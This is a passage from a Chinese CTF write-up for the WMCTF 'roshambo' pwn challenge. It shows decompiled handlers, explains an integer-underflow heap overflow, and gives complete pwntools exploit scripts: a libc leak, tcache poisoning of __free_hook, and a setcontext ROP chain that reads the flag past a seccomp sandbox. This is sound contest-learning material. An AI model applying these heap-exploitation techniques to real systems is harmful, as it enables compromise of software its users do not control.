c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_2424</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *size_4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  size_4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(size_4, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s &gt;&gt; "</span>, &amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, size_4, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(size_4, <span class="string">"EXIT"</span>, <span class="number">4u</span>LL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_QWORD *)size_4 + <span class="number">1</span>) != <span class="number">8L</span>L || game_status != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( *((_QWORD *)size_4 + <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( !game_status_remote )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(size_4 + <span class="number">56</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">          *((_QWORD *)size_4 + <span class="number">2</span>) = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * mode_is_L]);</span><br><span class="line">          sha256((__int64)(size_4 + <span class="number">24</span>), (__int64)(size_4 + <span class="number">56</span>), *((_QWORD *)size_4 + <span class="number">2</span>));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        print_info((__int64)&amp;name_str[<span class="number">32</span> * mode_is_L], (__int64)(size_4 + <span class="number">56</span>));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Game is starting.."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          game_status = <span class="number">1</span>;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Game start!"</span>);</span><br><span class="line">          game_status_remote = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7L</span>L:</span><br><span class="line">        <span class="keyword">if</span> ( game_status_remote != <span class="number">1</span> || game_status != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        prepared[mode_is_L] = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt; You choose %s\n"</span>, &amp;aRock[<span class="number">16</span> * prepared[mode_is_L] - <span class="number">16</span>]);</span><br><span class="line">        ++play_times;</span><br><span class="line">        <span class="keyword">if</span> ( prepared[mode_is_L == <span class="number">0</span>] )</span><br><span class="line">          play();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          game_status_remote = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = get_length((__int64)size_4);</span><br><span class="line">    <span class="built_in">write</span>(file_file[mode_is_L], size_4, v1);</span><br><span class="line">    <span class="built_in">free</span>(size_4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    print_game_result();</span><br><span class="line">    v0 = get_length((__int64)size_4);</span><br><span class="line">    <span class="built_in">write</span>(file_file[mode_is_L], size_4, v0);</span><br><span class="line">    <span class="built_in">free</span>(size_4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">    <span class="built_in">size</span> = read_n();</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Too big!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"what do you want to say? "</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="built_in">size</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"leave: %s"</span>, ptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>case 8</code>就是结束游戏，然后留言的功能，进入这个case的前提是游戏已经开始过。</p></li><li><p>同时还要注意的是，存在一个sandbox，禁用了<code>execve</code>，那么只能orw了：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803113637039.png" alt="image-20200803113637039"></p></li><li><p>理清逻辑之后，可以开始利用了。关键在于这个<code>case 8</code>，接受size的时候，只检查<code>size &gt; 0x100</code>，而当<code>size = 0</code>的时候，<code>malloc</code>会分配0x20 bytes，而注意到<code>read(0, ptr, size - 1);</code>，size - 1造成负整数溢出，从而这里存在一个堆溢出。</p></li><li><p>知道这一点之后就很简单了，利用heap overflow伪造unsorted bin，利用unsorted bin来leak libc；再tcache poisoning，分配<code>__free_hook</code>就能改了；之后就是常规套路，改<code>__free_hook</code>为<code>setcontext + 53</code>的同时，布置好rop即可；最后触发free的时候就读到flag了：</p><p><img src="/2020/08/08/WMCTF-%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3/image-20200803113939691.png" alt="image-20200803113939691"></p></li><li><p>不过从这个flag来看，最后感觉是不是非预期了啊，确实很多东西都没用到。不过还有一个存在漏洞的点，就是<code>recv_client</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">sub_15CE</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( *(_QWORD *)(a1 + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_hash(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Enter Game] Player Name: %s \n\n"</span>, a1 + <span class="number">56</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">56</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">        add_player_info();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)check_hash(a1) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[Enter Game] Player Name: %s \n\n"</span>, a1 + <span class="number">56</span>);</span><br><span class="line">        <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (<span class="keyword">const</span> <span class="keyword">char</span> *)(a1 + <span class="number">56</span>), <span class="number">0x20</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">      <span class="keyword">if</span> ( *(_QWORD *)(a1 + <span class="number">16</span>) &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(*(_QWORD *)(a1 + <span class="number">16</span>));</span><br><span class="line">        <span class="built_in">memcpy</span>(ptr, (<span class="keyword">const</span> <span class="keyword">void</span> *)(a1 + <span class="number">56</span>), *(_QWORD *)(a1 + <span class="number">16</span>));</span><br><span class="line">        print_info((__int64)&amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)], (__int64)ptr);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Game start!"</span>);</span><br><span class="line">      game_status = <span class="number">1</span>;</span><br><span class="line">      game_status_remote = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7L</span>L:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[%s]: I'm prepared\n"</span>, &amp;name_str[<span class="number">32</span> * (mode_is_L == <span class="number">0</span>)]);</span><br><span class="line">      prepared[mode_is_L == <span class="number">0</span>] = <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">if</span> ( prepared[mode_is_L] )</span><br><span class="line">        play();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8L</span>L:</span><br><span class="line">      print_game_result();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">      <span class="built_in">size</span> = read_n();                          <span class="comment">// integer overflow =============================================</span></span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">0x100</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Too big!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="built_in">size</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"what do you want to say? "</span>);</span><br><span class="line">      <span class="built_in">read</span>(<span class="number">0</span>, ptr, <span class="built_in">size</span> - <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"leave: %s"</span>, ptr);</span><br><span class="line">      <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>case 3</code>这里，先是分配了一个chunk给了<code>ptr</code>，这与<code>case 8</code>中的<code>ptr</code>是一致的，同时这里在<code>free</code>之前还<code>sleep(2)</code>，也就是说，在这2s之内，如果另一个线程<code>client</code>也分配了一个chunk写入<code>ptr</code>，那么这里就有一个tcache double free。（这里没有验证过，有兴趣的可以自行尝试）</p></li><li><p>exp</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''pwn_roshambo_C.py'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">64681</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ec0d0</span></span><br><span class="line">__free_hook_offset = libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">setcontext_offset = libc.sym[<span class="string">'setcontext'</span>]</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(auth, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your Mode: '</span>, <span class="string">'C'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Authorization: "</span>, auth)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your Name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(status, case, name_len=<span class="number">0</span>, hash_data=<span class="string">""</span>, name=<span class="string">""</span>, token=<span class="string">" &gt;&gt; "</span>)</span>:</span></span><br><span class="line">    payload = status.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>) + p64(case)</span><br><span class="line">    <span class="keyword">if</span> name_len != <span class="number">0</span>:</span><br><span class="line">        payload += p64(name_len) + hash_data + name</span><br><span class="line">    p.sendlineafter(token, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"what do you want to say? "</span>, content)</span><br><span class="line"></span><br><span class="line">start(<span class="string">'123'</span>, <span class="string">'123'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x18</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x28</span>, <span class="string">'test'</span>)</span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x0</span>, <span class="string">"A"</span> * <span class="number">0x118</span> + p64(<span class="number">0x501</span>))   <span class="comment"># unsorted bin</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, <span class="number">0x700</span>, <span class="string">''</span>, (p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>)) * <span class="number">0x65</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x28</span>, <span class="string">"AAAA"</span>)  <span class="comment"># free unsorted bin</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0x0</span>, <span class="string">"A"</span> * <span class="number">0x117</span> + <span class="string">"libcaddr"</span>)   <span class="comment"># leak</span></span><br><span class="line">p.recvuntil(<span class="string">"libcaddr\n"</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_setcontext = libc_base + setcontext_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># tcahe poisoning</span></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0xF1</span>) + p64(__free_hook))   </span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, <span class="string">"AAAA"</span>)   </span><br><span class="line"></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002155f</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000023e6a</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000001b96</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">libc_open = libc_base + libc.sym[<span class="string">'open'</span>]</span><br><span class="line">libc_read = libc_base + libc.sym[<span class="string">'read'</span>]</span><br><span class="line">libc_write = libc_base + libc.sym[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(libc_setcontext + <span class="number">53</span>)</span><br><span class="line">payload += flat([__free_hook + <span class="number">0xB0</span>, pop_rsi, <span class="number">0</span>, libc_open]) <span class="comment"># 0x20</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">5</span>, pop_rsi, __free_hook + <span class="number">0xC0</span>, pop_rdx, <span class="number">0x30</span>, libc_read]) <span class="comment"># 0x38</span></span><br><span class="line">payload += flat([pop_rdi, <span class="number">1</span>, pop_rsi, __free_hook + <span class="number">0xC0</span>, pop_rdx, <span class="number">0x30</span>, libc_write]) <span class="comment"># 0x38</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += flat([__free_hook + <span class="number">8</span>, pop_rdi])</span><br><span class="line">payload += <span class="string">'flag\x00'</span></span><br><span class="line"></span><br><span class="line">choose(<span class="string">'[RPC]'</span>, <span class="number">8</span>, token=<span class="string">"Game start!"</span>)</span><br><span class="line">say(<span class="number">0xF8</span>, payload)  </span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''pwn_roshambo_L.py'''</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'81.68.174.63'</span>, <span class="number">64681</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(room, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'Your Mode: '</span>, <span class="string">'L'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your room: "</span>, room)</span><br><span class="line">    p.sendlineafter(<span class="string">"Your Name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(status, case, name_len=<span class="number">0</span>, hash_data=<span class="string">""</span>, name=<span class="string">""</span>)</span>:</span></span><br><span class="line">    payload = status.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>) + p64(case)</span><br><span class="line">    <span class="keyword">if</span> name_len != <span class="number">0</span>:</span><br><span class="line">        payload += p64(name_len) + hash_data + name</span><br><span class="line">    p.sendlineafter(<span class="string">" &gt;&gt; "</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">"what do you want to say? "</span>, content)</span><br><span class="line"></span><br><span class="line">start(sys.argv[<span class="number">1</span>], <span class="string">'123'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    choose(<span class="string">'[RPC]'</span>, <span class="number">4</span>)</span><br><span class="line">    say(<span class="number">0x18</span>, <span class="string">'test'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
